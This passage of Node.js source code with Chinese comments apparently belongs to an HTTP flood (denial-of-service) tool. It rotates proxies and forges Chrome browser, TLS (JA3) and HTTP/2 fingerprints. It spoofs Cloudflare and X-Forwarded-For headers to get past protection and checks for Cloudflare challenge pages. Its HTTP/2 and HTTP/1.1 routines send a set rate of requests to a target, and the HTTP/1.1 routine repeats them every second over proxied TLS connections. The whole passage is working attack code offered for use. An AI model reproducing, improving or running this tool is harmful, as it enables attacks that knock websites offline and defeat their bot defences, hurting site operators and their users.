      'Sec-Ch-Ua-Platform': chromeFingerprint.os === 'win' ? "Windows" : (chromeFingerprint.os === 'mac' ? "macOS" : "Linux"),
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate', 
      'Sec-Fetch-Site': 'none',
      'Sec-Fetch-User': '?1',
      'Referer': parsedUrl.origin
    };
    
    if (bypass === 'true') {
      headers['Cf-Ipcountry'] = ["US", "GB", "CA", "DE", "AU", "FR", "JP"][Math.floor(Math.random() * 7)];
      headers['Cf-Ray'] = crypto.randomBytes(8).toString('hex') + "-" + ["FRA", "AMS", "LHR", "CDG", "DFW", "LAX", "SJC"][Math.floor(Math.random() * 7)];
      headers['Cf-Visitor'] = '{"scheme":"https"}';
      headers['X-Forwarded-For'] = getRandomPrivateIP();
      headers['X-Forwarded-Proto'] = "https";
    }
    
    const options = {
      host: parsedUrl.hostname,
      port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
      path: parsedUrl.pathname + parsedUrl.search,
      method: 'GET',
      headers: headers,
      timeout: 10000,
      rejectUnauthorized: false
    };
    
    if (debug === 'true') {
      log("调试".cyan + " 本机测试请求: " + parsedUrl.href);
      log("调试".cyan + " 请求头: " + JSON.stringify(headers, null, 2));
    }
    
    const protocol = parsedUrl.protocol === 'https:' ? https : http;
    
    const req = protocol.request(options, (res) => {
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        if (debug === 'true') {
          log("调试".yellow + " 被重定向到: " + res.headers.location);
        }
        
        try {
          const redirectUrl = new URL(res.headers.location, parsedUrl.href);
          localTestingResults = {
            success: true,
            title: "Unknown",
            status: res.statusCode.toString(),
            lastChecked: now
          };
          
          if (!successCodes[res.statusCode]) {
            successCodes[res.statusCode] = 0;
          }
          successCodes[res.statusCode]++;
          totalRequests++;
          
          log("网站".cyan + ": " + "Unknown" + " | " + "状态码".cyan + ": " + res.statusCode);
          return;
        } catch (error) {
          if (debug === 'true') {
            log("错误".red + " 解析重定向URL失败: " + error.message);
          }
        }
      }
      
      const contentType = res.headers['content-type'] || '';
      if (debug === 'true') {
        log("调试".cyan + " 响应头: " + JSON.stringify(res.headers, null, 2));
        log("调试".cyan + " 内容类型: " + contentType);
      }
      
      if (res.statusCode === 403) {
        localTestingResults = {
          success: true,
          title: "Unknown",
          status: "403",
          lastChecked: now
        };
        
        if (!successCodes["403"]) {
          successCodes["403"] = 0;
        }
        successCodes["403"]++;
        totalRequests++;
        
        log("网站".cyan + ": " + "Unknown" + " | " + "状态码".cyan + ": 403");
        return;
      }
      
      if (!contentType.includes('text/html')) {
        localTestingResults = {
          success: true,
          title: "Unknown",
          status: res.statusCode.toString(),
          lastChecked: now
        };
        
        if (!successCodes[res.statusCode]) {
          successCodes[res.statusCode] = 0;
        }
        successCodes[res.statusCode]++;
        totalRequests++;
        
        log("Title".yellow + ": " + "Unknown" + " | " + "status".Purple + ": " + res.statusCode);
        return;
      }
      
      let data = Buffer.alloc(0);
      
      res.on('data', (chunk) => {
        data = Buffer.concat([data, chunk]);
      });
      
      res.on('end', () => {
        if (debug === 'true') {
          log("调试".cyan + " 收到HTTP响应，长度: " + data.length + " 字节");
        }
        
        let title = "Unknown";
        
        if (data && data.length > 0) {
          try {
            const contentEncoding = res.headers['content-encoding'] || '';
            let htmlContent = '';
            
            if (contentEncoding.includes('gzip')) {
              if (debug === 'true') {
                log("调试".yellow + " 检测到gzip编码内容");
              }
              try {
                const zlib = require('zlib');
                const unzipped = zlib.gunzipSync(data);
                htmlContent = unzipped.toString('utf8');
              } catch (error) {
                if (debug === 'true') {
                  log("错误".red + " 解压gzip内容失败: " + error.message);
                }
                htmlContent = data.toString('utf8');
              }
            } else if (contentEncoding.includes('br')) {
              if (debug === 'true') {
                log("调试".yellow + " 检测到br编码内容");
              }
              try {
                const zlib = require('zlib');
                const unzipped = zlib.brotliDecompressSync(data);
                htmlContent = unzipped.toString('utf8');
              } catch (error) {
                if (debug === 'true') {
                  log("错误".red + " 解压br内容失败: " + error.message);
                }
                htmlContent = data.toString('utf8');
              }
            } else if (contentEncoding.includes('deflate')) {
              if (debug === 'true') {
                log("调试".yellow + " 检测到deflate编码内容");
              }
              try {
                const zlib = require('zlib');
                const unzipped = zlib.inflateSync(data);
                htmlContent = unzipped.toString('utf8');
              } catch (error) {
                if (debug === 'true') {
                  log("错误".red + " 解压deflate内容失败: " + error.message);
                }
                htmlContent = data.toString('utf8');
              }
            } else {
              try {
                let charset = 'utf-8';
                if (contentType.includes('charset=')) {
                  charset = contentType.split('charset=')[1].split(';')[0].trim().toLowerCase();
                }
                
                if (debug === 'true') {
                  log("调试".cyan + " 检测到字符集: " + charset);
                }
                
                if (charset === 'utf-8' || charset === 'utf8') {
                  htmlContent = data.toString('utf8');
                  
                  if (htmlContent.includes('') || !htmlContent.includes('<')) {
                    if (debug === 'true') {
                      log("调试".yellow + " UTF-8解码有问题，尝试其他编码");
                    }
                    
                    try {
                      const iconvLite = require('iconv-lite');
                      if (iconvLite) {
                        htmlContent = iconvLite.decode(data, 'utf8');
                        if (debug === 'true') {
                          log("调试".cyan + " 使用iconv-lite解码UTF-8");
                        }
                      }
                    } catch (err) {
                      if (debug === 'true') {
                        log("调试".yellow + " iconv-lite未安装，使用备选方法");
                      }
                    }
                  }
                } else if (charset === 'gbk' || charset === 'gb2312' || charset === 'gb18030') {
                  try {
                    const iconvLite = require('iconv-lite');
                    if (iconvLite) {
                      htmlContent = iconvLite.decode(data, charset);
                      if (debug === 'true') {
                        log("调试".cyan + " 使用iconv-lite解码" + charset);
                      }
                    } else {
                      htmlContent = data.toString('binary');
                      if (debug === 'true') {
                        log("调试".yellow + " 无法使用iconv-lite，使用binary编码");
                      }
                    }
                  } catch (err) {
                    htmlContent = data.toString('binary');
                    if (debug === 'true') {
                      log("调试".yellow + " 编码转换失败，使用binary编码: " + err.message);
                    }
                  }
                } else {
                  htmlContent = data.toString('binary');
                  if (debug === 'true') {
                    log("调试".yellow + " 使用binary编码处理未知字符集: " + charset);
                  }
                }
              } catch (error) {
                if (debug === 'true') {
                  log("错误".red + " 解码HTML内容失败: " + error.message);
                }
                htmlContent = data.toString();
              }
            }
            
            if (htmlContent.charCodeAt(0) === 0xFEFF) {
              htmlContent = htmlContent.slice(1);
            }
            
            if (debug === 'true') {
              const preview = htmlContent.substring(0, 200).replace(/[\r\n]+/g, ' ');
              log("调试".cyan + " HTML预览: " + preview);
            }
            
            title = extractPageTitle(htmlContent);
            
            if (title !== "Unknown" && (title.includes('') || /[\u00ff-\uffff]/.test(title))) {
              if (debug === 'true') {
                log("调试".yellow + " 检测到标题可能有编码问题，尝试修复...");
              }
              
              try {
                const rawTitle = title;
                
                if (Buffer.from(title).toString('utf8') !== title) {
                  try {
                    const iconvLite = require('iconv-lite');
                    if (iconvLite) {
                      const binaryTitle = Buffer.from(title, 'binary');
                      title = iconvLite.decode(binaryTitle, 'gbk');
                      if (debug === 'true') {
                        log("调试".green + " 使用GBK修复标题: " + title);
                      }
                    }
                  } catch (err) {
                    if (debug === 'true') {
                      log("调试".yellow + " iconv-lite修复标题失败: " + err.message);
                    }
                    
                    title = title.replace(/[^\x00-\x7F]/g, '').trim();
                    if (title === '') {
                      title = parsedUrl.hostname;
                      if (debug === 'true') {
                        log("调试".yellow + " 使用域名作为标题: " + title);
                      }
                    }
                  }
                }
                
                if (debug === 'true' && rawTitle !== title) {
                  log("调试".green + " 标题编码修复前: " + rawTitle);
                  log("调试".green + " 标题编码修复后: " + title);
                }
              } catch (error) {
                if (debug === 'true') {
                  log("错误".red + " 尝试修复标题编码时出错: " + error.message);
                }
                
                title = parsedUrl.hostname || "Unknown";
              }
            }
          } catch (error) {
            if (debug === 'true') {
              log("错误".red + " 处理HTML内容时出错: " + error.message);
            }
          }
        } else {
          if (debug === 'true') {
            log("调试".red + " 服务器响应内容为空");
          }
        }
        
        localTestingResults = {
          success: true,
          title: title,
          status: res.statusCode.toString(),
          lastChecked: now
        };
        
        pageTitle = title;
        if (!successCodes[res.statusCode]) {
          successCodes[res.statusCode] = 0;
        }
        successCodes[res.statusCode]++;
        totalRequests++;
        
        log("Title".yellow + ": " + title + " | " + "status".magenta + ": " + res.statusCode);
      });
    });
    
    req.on('error', (error) => {
      localTestingResults = {
        success: false,
        title: "Error: " + error.message.substring(0, 30),
        status: "Error",
        lastChecked: now,
        error: error.message
      };
      
      if (debug === 'true') {
        log("错误".red + " 连接失败: " + error.message);
      } else {
        log("Title".yellow + ": " + parsedUrl.hostname + " | " + "状态".red + ": 连接失败");
      }
    });
    
    req.end();
  } catch (error) {
    localTestingResults = {
      success: false,
      title: "Error: " + error.message.substring(0, 30),
      status: "Error",
      lastChecked: now,
      error: error.message
    };
    
    if (debug === 'true') {
      log("错误".red + " 服务器检测失败: " + error.message);
    } else {
      log("网站".cyan + ": " + (parsedUrl ? parsedUrl.hostname : args.target) + " | " + "状态".red + ": 服务器检测失败");
    }
  }
}

function generateJA3Fingerprint() {
    const chromeVersions = ['chrome135', 'chrome136', 'chrome137', 'chrome138'];
    const selectedVersion = chromeVersions[Math.floor(Math.random() * chromeVersions.length)];
    
    return chromeJA3Fingerprints[selectedVersion];
}

function generateChromeFingerprint() {
  const versions = ['135', '136', '137', '138'];
  const randomVersion = versions[Math.floor(Math.random() * versions.length)];
  
  const platforms = {
    "win": {
      ua: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.0.0 Safari/537.36`,
      platform: "Win32",
      oscpu: "Windows NT 10.0; Win64; x64"
    },
    "mac": {
      ua: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.0.0 Safari/537.36`,
      platform: "MacIntel",
      oscpu: "Intel Mac OS X 10_15_7"
    }
  };
  
  const os = Math.random() < 0.7 ? 'win' : 'mac';
  const selectedPlatform = platforms[os];
  
  const languages = ['en-US,en;q=0.9', 'zh-CN,zh;q=0.9,en;q=0.8'];
  const language = languages[Math.floor(Math.random() * languages.length)];
  
  const resolutions = [
    {width: 1920, height: 1080},
    {width: 1366, height: 768},
    {width: 1536, height: 864}
  ];
  const resolution = resolutions[Math.floor(Math.random() * resolutions.length)];
  
  const humanBehavior = {
    loadTimes: [800, 1200, 1500, 2000]
  };
  
  const features = {
    userAgent: selectedPlatform.ua,
    platform: selectedPlatform.platform,
    oscpu: selectedPlatform.oscpu,
    language: language,
    languages: [language.split(',')[0], "en-US", "en"],
    deviceMemory: [0.25, 0.5, 1, 2, 4, 8][Math.floor(Math.random() * 6)],
    hardwareConcurrency: [2, 4, 6, 8][Math.floor(Math.random() * 4)],
    secChUaFullVersionList: `"Google Chrome";v="${randomVersion}.0.0.0", "Chromium";v="${randomVersion}.0.0.0", "Not/A)Brand";v="24.0.0.0"`,
    secChUaBitness: "64",
    secChUaPlatform: os === 'win' ? "Windows" : "macOS",
    humanBehavior: humanBehavior
  };
  
  const ja3 = generateJA3Fingerprint();
  
  return {
    version: randomVersion,
    userAgent: selectedPlatform.ua,
    features: features,
    fingerprint: crypto.createHash('sha256').update(JSON.stringify(features) + Math.random()).digest('hex'),
    ja3: ja3,
    os: os
  };
}

function buildHttp2Headers(chromeFingerprint, parsedTarget, requestPath) {
  const h2headers = {};
  
  const chromeVersion = `chrome${chromeFingerprint.version}`;
  const chromeUAConfig = headerBuilder.chromeUA[chromeVersion] || headerBuilder.chromeUA.chrome137;
  
  h2headers[":method"] = "GET";
  h2headers[":authority"] = parsedTarget.host;
  h2headers[":scheme"] = "https";
  h2headers[":path"] = requestPath;
  
  // 使用Chrome 137标准标头顺序
  if (chromeVersion === 'chrome137' || !chromeUAConfig) {
    // 完全使用用户提供的标头顺序和值
    h2headers["accept"] = chromeUAConfig?.accept || "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
    h2headers["accept-encoding"] = chromeUAConfig?.acceptEncoding || "gzip, deflate, br, zstd";
    h2headers["accept-language"] = chromeUAConfig?.acceptLanguage || "zh-CN,zh;q=0.9,en;q=0.8";
    h2headers["cache-control"] = chromeUAConfig?.cacheControl || "max-age=0";
    
    // 随机添加if-modified-since
    if (Math.random() > 0.3) {
      const modDate = new Date();
      modDate.setDate(modDate.getDate() - Math.floor(Math.random() * 7)); // 1-7天前
      h2headers["if-modified-since"] = modDate.toUTCString();
    }
    
    h2headers["priority"] = chromeUAConfig?.priority || "u=0, i";
    h2headers["sec-ch-ua"] = chromeUAConfig?.secChUa || '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"';
    h2headers["sec-ch-ua-arch"] = chromeUAConfig?.secChUaArch || "x86";
    h2headers["sec-ch-ua-bitness"] = chromeUAConfig?.secChUaBitness || "64";
    h2headers["sec-ch-ua-full-version"] = chromeUAConfig?.secChUaFullVersion || "137.0.7151.41";
    h2headers["sec-ch-ua-full-version-list"] = chromeUAConfig?.secChUaFullVersionList || '"Google Chrome";v="137.0.7151.41", "Chromium";v="137.0.7151.41", "Not/A)Brand";v="24.0.0.0"';
    h2headers["sec-ch-ua-mobile"] = chromeUAConfig?.secChUaMobile || "?0";
    h2headers["sec-ch-ua-model"] = chromeUAConfig?.secChUaModel || "";
    h2headers["sec-ch-ua-platform"] = chromeUAConfig?.secChUaPlatform || "Windows";
    h2headers["sec-ch-ua-platform-version"] = chromeUAConfig?.secChUaPlatformVersion || "19.0.0";
    h2headers["sec-fetch-dest"] = "document";
    h2headers["sec-fetch-mode"] = "navigate";
    h2headers["sec-fetch-site"] = "none";
    h2headers["sec-fetch-user"] = "?1";
    h2headers["upgrade-insecure-requests"] = "1";
    h2headers["user-agent"] = chromeUAConfig?.ua || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36";
    h2headers["device-memory"] = chromeFingerprint.features.deviceMemory.toString();
  } else {
    // 其他Chrome版本使用默认设置
    h2headers["user-agent"] = chromeUAConfig ? chromeUAConfig.ua : chromeFingerprint.userAgent;
    h2headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
    h2headers["accept-encoding"] = "gzip, deflate, br, zstd";
    h2headers["accept-language"] = chromeFingerprint.features.language || "zh-CN,zh;q=0.9,en;q=0.8";
    h2headers["cache-control"] = "max-age=0";
    h2headers["priority"] = "u=0, i";
    h2headers["upgrade-insecure-requests"] = "1";
    
    // Sec-CH-UA 系列标头
    if (chromeUAConfig) {
      h2headers["sec-ch-ua"] = chromeUAConfig.secChUa;
      h2headers["sec-ch-ua-arch"] = chromeUAConfig.secChUaArch || "x86";
      h2headers["sec-ch-ua-bitness"] = chromeUAConfig.secChUaBitness || "64";
      h2headers["sec-ch-ua-full-version"] = chromeUAConfig.secChUaFullVersion;
      h2headers["sec-ch-ua-full-version-list"] = chromeUAConfig.secChUaFullVersionList;
      h2headers["sec-ch-ua-mobile"] = chromeUAConfig.secChUaMobile || "?0";
      h2headers["sec-ch-ua-model"] = chromeUAConfig.secChUaModel || "";
      h2headers["sec-ch-ua-platform"] = chromeUAConfig.secChUaPlatform || "Windows";
      h2headers["sec-ch-ua-platform-version"] = chromeUAConfig.secChUaPlatformVersion;
    } else {
      // 如果没有特定配置，使用动态生成的值
      h2headers["sec-ch-ua"] = `"Google Chrome";v="${chromeFingerprint.version}", "Chromium";v="${chromeFingerprint.version}", "Not/A)Brand";v="24"`;
      h2headers["sec-ch-ua-mobile"] = "?0";
      h2headers["sec-ch-ua-platform"] = chromeFingerprint.features.secChUaPlatform || (chromeFingerprint.os === 'win' ? "Windows" : "macOS");
      h2headers["sec-ch-ua-full-version-list"] = chromeFingerprint.features.secChUaFullVersionList;
      h2headers["sec-ch-ua-bitness"] = chromeFingerprint.features.secChUaBitness;
      h2headers["sec-ch-ua-arch"] = "x86";  // 使用固定值，精简代码
      h2headers["sec-ch-ua-platform-version"] = "15.0.0";  // 使用固定值，精简代码
      h2headers["sec-ch-ua-model"] = "";  // 使用固定值，精简代码
      h2headers["device-memory"] = chromeFingerprint.features.deviceMemory.toString();  // 添加Device-Memory头
    }
    
    // Sec-Fetch 系列标头
    h2headers["sec-fetch-dest"] = "document";
    h2headers["sec-fetch-mode"] = "navigate";
    h2headers["sec-fetch-site"] = "none";
    h2headers["sec-fetch-user"] = "?1";
  }
  
  return h2headers;
}

// 添加Cookie存储
const cookieJar = {};

// 修改http2run函数，增强模拟真实浏览器行为
function http2run() {
  try {
    const proxyAddr = randomElement(proxies);
    if (!proxyAddr || !proxyAddr.includes(':')) {
      log("错误".red + " 无效的代理: " + proxyAddr);
      return;
    }
    
    if (debug === 'true') {
      log("调试".cyan + " 尝试使用代理: " + proxyAddr);
    }
    
    const parsedProxy = proxyAddr.split(":");
    const chromeFingerprint = generateChromeFingerprint();
    
    if (debug === 'true') {
      log("调试".cyan + " 生成Chrome指纹: " + chromeFingerprint.version);
    }
    
    // 确定请求路径
    let requestPath;
    if (random === 'true') {
      // 使用更真实的随机路径模式 - 模拟用户浏览网站的行为
      const paths = [
        "/",
        "/about",
        "/contact",
        "/products",
        "/services",
        "/blog",
        "/news",
        "/faq",
        "/privacy-policy",
        "/terms-of-service"
      ];
      requestPath = paths[Math.floor(Math.random() * paths.length)];
    } else {
      requestPath = parsedTarget.path || "/";
    }
    
    if (debug === 'true') {
      log("调试".cyan + " 请求路径: " + requestPath);
    }
    
    // 如果是真实的网站，随机生成真实查询参数
    if (Math.random() < 0.3 && bypass === 'true') {
      const realQueryParams = [
        "utm_source=google",
        "utm_medium=cpc",
        "utm_campaign=brand",
        "ref=home",
        "page=1",
        "sort=newest",
        "lang=en",
        "t=" + Date.now(),
        "fbclid=" + randstr(16),
        "gclid=" + randstr(16)
      ];
      
      // 添加1-2个随机参数
      const numParams = Math.floor(Math.random() * 2) + 1;
      const selectedParams = [];
      
      for (let i = 0; i < numParams; i++) {
        const param = realQueryParams[Math.floor(Math.random() * realQueryParams.length)];
        if (!selectedParams.includes(param)) {
          selectedParams.push(param);
        }
      }
      
      if (selectedParams.length > 0) {
        requestPath += (requestPath.includes('?') ? '&' : '?') + selectedParams.join('&');
      }
    }
    
    // 构建HTTP/2头部 - 使用增强的函数
    const h2headers = buildHttp2Headers(chromeFingerprint, parsedTarget, requestPath);
    
    const proxyOptions = {
      host: parsedProxy[0],
      port: ~~parsedProxy[1],
      address: parsedTarget.host + ":443",
      timeout: 10000, // 增加超时时间，更符合真实浏览器
    };
    
    Socker.HTTP(proxyOptions, (connection, error) => {
      if (error) {
        failedRequests++;
        
        // 代理连接失败，考虑使用本机测试
        if (failedRequests > 10 && cluster.isWorker) {
          if (!useLocalTesting) {
            useLocalTesting = true;
            log("代理连接失败率高".red + " 启用本机测试");
            setTimeout(checkServerDirectly, 500);
          }
        }
        
        if (debug === 'true') {
          log("错误".red + " 代理连接失败: " + proxyAddr + " - " + error);
        }
        return;
      }
      
      connection.setKeepAlive(true, 60000);
      
      // 检查是否是IP地址
      const isIPAddress = isIP(parsedTarget.host);
      
      // 增强的TLS选项，更接近Chrome，增加绕过能力
      const tlsOptions = {
        secure: true,
        ALPNProtocols: ['h2', 'http/1.1'],
        socket: connection,
        // 使用更简单的cipher配置
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256",
        minVersion: "TLSv1.2",
        maxVersion: "TLSv1.3",
        host: parsedTarget.host,
        rejectUnauthorized: false,
        requestCert: true,
        ecdhCurve: "prime256v1:X25519",
        sessionTimeout: 3600,
        sessionTicket: true,
        secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1
      };
      
      // 只在非IP地址时设置servername
      if (!isIPAddress) {
        tlsOptions.servername = parsedTarget.host;
      }
      
      try {
        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);
        
        // 模拟人工延迟 - 添加随机连接延迟
        const delayBeforeRequest = Math.floor(Math.random() * 1000) + 500; // 500-1500ms的随机延迟
        
        // 增强的HTTP/2设置
        const http2Settings = {
          headerTableSize: chromeHTTP2Settings[`chrome${chromeFingerprint.version}`] ? 
                          chromeHTTP2Settings[`chrome${chromeFingerprint.version}`].headerTableSize : 
                          chromeHTTP2Settings.chrome138.headerTableSize,
          maxConcurrentStreams: chromeHTTP2Settings[`chrome${chromeFingerprint.version}`] ? 
                               chromeHTTP2Settings[`chrome${chromeFingerprint.version}`].maxConcurrentStreams : 
                               chromeHTTP2Settings.chrome138.maxConcurrentStreams,
          initialWindowSize: chromeHTTP2Settings[`chrome${chromeFingerprint.version}`] ? 
                            chromeHTTP2Settings[`chrome${chromeFingerprint.version}`].initialWindowSize : 
                            chromeHTTP2Settings.chrome138.initialWindowSize,
          maxHeaderListSize: chromeHTTP2Settings[`chrome${chromeFingerprint.version}`] ? 
                            chromeHTTP2Settings[`chrome${chromeFingerprint.version}`].maxHeaderListSize : 
                            chromeHTTP2Settings.chrome138.maxHeaderListSize,
          enablePush: chromeHTTP2Settings[`chrome${chromeFingerprint.version}`] ? 
                     chromeHTTP2Settings[`chrome${chromeFingerprint.version}`].enablePush : 
                     chromeHTTP2Settings.chrome138.enablePush,
          maxSessionMemory: 10,
          maxDeflateDynamicTableSize: 4294967295,
          createConnection: () => tlsConn,
          socket: connection,
          protocol: "https:"
        };
        
        const client = http2.connect(parsedTarget.href, http2Settings);
        
        client.on("connect", () => {
          // 添加Chrome风格的HTTP/2设置
          client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });
          
          // 设置Chrome HTTP/2优先级帧
          setTimeout(() => {
            // 模拟真实浏览器: 不要一次性发送所有请求
            // 模拟人类用户，分散发送请求
            let requestsSent = 0;
            
            function sendNextRequest() {
              if (requestsSent >= args.Rate) return;
              
              // 创建请求并发送
              const request = client.request(h2headers);
              
              request.on("response", response => {
                successRequests++;
                
                // 向主进程发送状态更新
                if (cluster.isWorker) {
                  process.send({ 
                    type: 'status_update', 
                    status: response[':status'],
                    worker: cluster.worker.id
                  });
                  
                  // 增加计数
                  sentRequests++;
                }
                
                if (debug === 'true') {
                  const jsonDebug = {
                    proxy: proxyAddr,
                    code: response[':status'],
                    path: h2headers[':path']
                  };
                  log('调试'.yellow + '  ' + JSON.stringify(jsonDebug));
                }
                
                // 处理并保存Cookie
                if (response['set-cookie']) {
                  const cookies = response['set-cookie'];
                  if (cookies && cookies.length > 0) {
                    const formattedCookies = cookies
                      .map(cookie => cookie.split(';')[0].trim())
                      .join('; ');
                    
                    // 保存Cookie到Jar
                    cookieJar[parsedTarget.host] = formattedCookies;
                    
                    if (debug === 'true' && 
                      (formattedCookies.includes('cf_clearance') || 
                      formattedCookies.includes('__cf_bm'))) {
                      log('Cookie'.green + '  ' + 'Cloudflare Cookie捕获: ' + formattedCookies.substring(0, 20) + '...');
                    }
                  }
                }
                
                // 检查是否需要跟随重定向
                if (response[':status'] >= 300 && response[':status'] < 400 && response['location']) {
                  if (debug === 'true') {
                    log('重定向'.blue + ' ' + response[':status'] + ' -> ' + response['location']);
                  }
                  
                  // 模拟真实浏览器 - 跟随重定向
                  if (bypass === 'true' && Math.random() < 0.8) {
                    try {
                      const redirectUrl = new URL(response['location'], parsedTarget.href);
                      
                      // 更新请求路径
                      h2headers[':path'] = redirectUrl.pathname + redirectUrl.search;
                      
                      // 如果需要，更新主机
                      if (redirectUrl.host !== parsedTarget.host) {
                        h2headers[':authority'] = redirectUrl.host;
                        h2headers['host'] = redirectUrl.host;
                      }
                      
                      // 添加重定向后的refer
                      h2headers['referer'] = parsedTarget.href;
                      
                      // 延迟后跟随重定向
                      setTimeout(() => {
                        const redirectRequest = client.request(h2headers);
                        redirectRequest.end();
                      }, Math.floor(Math.random() * 1000) + 500);
                    } catch (error) {
                      if (debug === 'true') {
                        log("错误".red + " 处理重定向失败: " + error.message);
                      }
                    }
                  }
                }
                
                // 读取响应数据以便处理挑战和提取标题
                let responseData = Buffer.alloc(0);
                
                request.on('data', (chunk) => {
                  responseData = Buffer.concat([responseData, chunk]);
                });
                
                request.on('end', () => {
                  if (responseData.length > 0) {
                    const responseStr = responseData.toString();
                    
                    // 提取页面标题并发送给主进程
                    const title = extractPageTitle(responseStr);
                    if (title !== "Unknown" && cluster.isWorker) {
                      process.send({ 
                        type: 'status_update', 
                        title: title,
                        worker: cluster.worker.id
                      });
                    }
                    
                    // Cloudflare挑战检测和处理
                    if (responseStr.includes('challenge-platform') || 
                        responseStr.includes('cf-browser-verification') ||
                        responseStr.includes('data-cf-challenge')) {
                      if (debug === 'true') {
                        log('挑战'.red + ' 检测到Cloudflare挑战页面');
                      }
                      
                      // 提取挑战关键信息
                      try {
                        const rayIdMatch = responseStr.match(/Ray ID: ([a-f0-9]+)/i);
                        const rayId = rayIdMatch ? rayIdMatch[1] : 'unknown';
                        
                        if (debug === 'true') {
                          log('CF Ray ID'.yellow + ' ' + rayId);
                        }
                        
                        // 检测是否为难度较低的CAPTCHA挑战
                        const isCaptcha = responseStr.includes('cf_captcha') || responseStr.includes('hcaptcha');
                        if (isCaptcha && debug === 'true') {
                          log('CAPTCHA挑战'.yellow + ' 检测到可能的验证码挑战');
                        }
                      } catch (err) {
                        if (debug === 'true') {
                          log('挑战分析错误'.red + ' ' + err.message);
                        }
                      }
                    }
                  }
                });
              });
              
              request.on("error", (err) => {
                failedRequests++;
                if (debug === 'true') {
                  log("错误".red + " HTTP/2 请求失败: " + err.message);
                }
              });
              
              request.end();
              requestsSent++;
              
              
              if (requestsSent < args.Rate) {
                const networkDelay = simulateNetworkJitter(); 
                setTimeout(sendNextRequest, networkDelay);
              }
            }
            
            // 开始发送请求，使用简单的网络波动模拟
            setTimeout(sendNextRequest, simulateNetworkJitter());
          }, 100); 
        });
        
        client.on("error", (err) => {
          failedRequests++;
          if (debug === 'true') {
            log("错误".red + " HTTP/2 连接失败: " + err.message);
          }
          client.destroy();
          connection.destroy();
        });
        
        client.on("close", () => {
          client.destroy();
          connection.destroy();
        });
        
        
        if (bypass === 'true') {
        
        }
      } catch (err) {
        failedRequests++;
        if (debug === 'true') {
          log("错误".red + " TLS连接失败: " + err.message);
        }
        connection.destroy();
      }
    });
  } catch (err) {
    failedRequests++;
    if (debug === 'true') {
      log("错误".red + " HTTP/2请求总体失败: " + err.message);
    }
  }
}

// 修改http1run函数，确保正确使用代理
function http1run() {
  try {
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    if (!proxy || !proxy.includes(':')) {
      if (debug === 'true') {
        log("错误".red + " 无效的HTTP/1.1代理: " + proxy);
      }
      return;
    }
    
    proxy = proxy.split(':');

    var req = http.request({
        host: proxy[0],
        port: proxy[1],
        ciphers: cipper,
        method: 'CONNECT',
        path: parsedTarget.host + ":443"
    }, (err) => {
            if (err) {
                failedRequests++;
                if (debug === 'true') {
                    log("错误".red + " HTTP/1.1 代理连接失败: " + proxy[0] + ":" + proxy[1] + " - " + err.message);
                }
            }
        req.end();
        });

    var queryString;
    if (random === 'true') {
        queryString = "/" + randstr(10);
    } else {
        queryString = parsedTarget.path;
    }

    req.on('connect', function (res, socket, head) {
           
            const isIPAddress = isIP(parsedTarget.host);
            
            
            const tlsOptions = {
            host: parsedTarget.host,
            ciphers: cipper,
            secureProtocol: 'TLS_method',
            rejectUnauthorized: false,
            socket: socket
            };
            
            
            if (!isIPAddress) {
                tlsOptions.servername = parsedTarget.host;
            }
            
            try {
                var tlsConnection = tls.connect(tlsOptions, function () {
            setInterval(() => {
                for (let j = 0; j < args.Rate; j++) {
                            const selectedUserAgent = randomElement(headerBuilder.userAgent);
                            const selectedLanguage = randomElement(headerBuilder.acceptLang);
                            
                    let headers = "GET " + queryString + " HTTP/1.1\r\n" +
                        "Host: " + parsedTarget.host + "\r\n" +
                        "Referer: " + args.target + "\r\n" +
                        "Origin: " + args.target + "\r\n" +
                        `Accept: ${randomElement(headerBuilder.accept)}\r\n` +
                                "User-Agent: " + selectedUserAgent + "\r\n" +
                        "Upgrade-Insecure-Requests: 1\r\n" +
                        `Accept-Encoding: ${randomElement(headerBuilder.acceptEncoding)}\r\n` +
                                `Accept-Language: ${selectedLanguage}\r\n` +
                        "Cache-Control: max-age=0\r\n" +
                        "Connection: Keep-Alive\r\n";

                    if (bypass === 'true') {
                        headers += `cf-connecting-ip: ${getRandomPrivateIP()}\r\n`;
                        headers += `cf-ipcountry: US\r\n`;
                        headers += `cf-ray: ${randstr(10)}\r\n`;
                        headers += `cf-visitor: {"scheme":"https"}\r\n`;
                    }

                    headers += `\r\n`;

                    tlsConnection.write(headers);
                            successRequests++;
                        }
                    }, 1000);
                });
                
                tlsConnection.on('error', function (err) {
                    failedRequests++;
                    if (debug === 'true') {
                        log("错误".red + " HTTP/1.1 TLS错误: " + err.message);
                    }
            tlsConnection.end();
            tlsConnection.destroy();
                });

        tlsConnection.on("data", (chunk) => {
                    try {
            const responseLines = chunk.toString().split('\r\n');
            const firstLine = responseLines[0];
            const statusCode = parseInt(firstLine.split(' ')[1], 10);

            if (statusCode !== null && !isNaN(statusCode)) {
               
                if (cluster.isWorker) {
                    process.send({ 
                        type: 'status_update', 
                        status: statusCode.toString(),
                        worker: cluster.worker.id
                    });
